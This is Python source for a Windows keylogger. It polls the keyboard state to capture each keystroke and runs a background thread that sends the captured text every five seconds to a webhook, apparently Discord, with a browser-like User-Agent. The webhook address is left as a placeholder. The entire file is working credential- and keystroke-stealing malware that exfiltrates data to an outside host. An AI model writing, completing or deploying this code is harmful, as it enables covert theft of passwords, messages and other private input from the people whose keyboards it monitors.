import ctypes
import time
import urllib.request
import json
import threading

# ⚠️ PLACE YOUR SECURE WEBHOOK URL HERE
webhook_url = "ur webhook "
buffer = []
buffer_lock = threading.Lock()

# Load Windows API functions
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Map virtual key codes to readable names for common keys
VK_MAP = {
    0x08: "[BACKSPACE]", 0x0D: "\n", 0x20: " ", 0x10: "[SHIFT]",
    0x11: "[CTRL]", 0x12: "[ALT]", 0x1B: "[ESC]", 0x25: "[LEFT]",
    0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]", 0x2E: "[DELETE]"
}

def send_data():
    while True:
        time.sleep(5)  # Wait 5 seconds between sends
        if not buffer:
            continue

        with buffer_lock:
            data_to_send = list(buffer)
            buffer.clear()

        # Join the text characters together
        message_content = "".join(data_to_send)

        if not message_content.strip():
            continue

        try:
            # Send data using built-in urllib instead of requests
            payload = json.dumps({"content": message_content}).encode("utf-8")
            req = urllib.request.Request(
                webhook_url, 
                data=payload, 
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                print(f"Discord Response Status: {response.status}")
        except Exception as e:
            print(f"Network error: {e}")

# Start the background sender thread
threading.Thread(target=send_data, daemon=True).start()

print("Monitoring keyboard events... Press Ctrl+C in the console to stop.")

# Track the state of keys to detect the transition from "up" to "down"
state_table = [0] * 256

try:
    while True:
        # Loop through all possible virtual key codes (1 to 254)
        for vk in range(1, 255):
            # Get the asynchronous state of the key (highest bit indicates if pressed)
            is_pressed = user32.GetAsyncKeyState(vk) & 0x8000
            
            if is_pressed and not state_table[vk]:
                # Key transition: went from UP to DOWN
                state_table[vk] = 1
                
                # Format the key
                if vk in VK_MAP:
                    key_str = VK_MAP[vk]
                elif 0x30 <= vk <= 0x39 or 0x41 <= vk <= 0x5A:
                    # Numbers and Standard Letters
                    key_str = chr(vk).lower()
                else:
                    # Ignore unidentified system keys
                    continue
                
                with buffer_lock:
                    buffer.append(key_str)
                    
            elif not is_pressed and state_table[vk]:
                # Key transition: went from DOWN to UP
                state_table[vk] = 0
                
        time.sleep(0.01)  # Brief pause to prevent high CPU utilization
except KeyboardInterrupt:
    print("\nProgram stopped.")
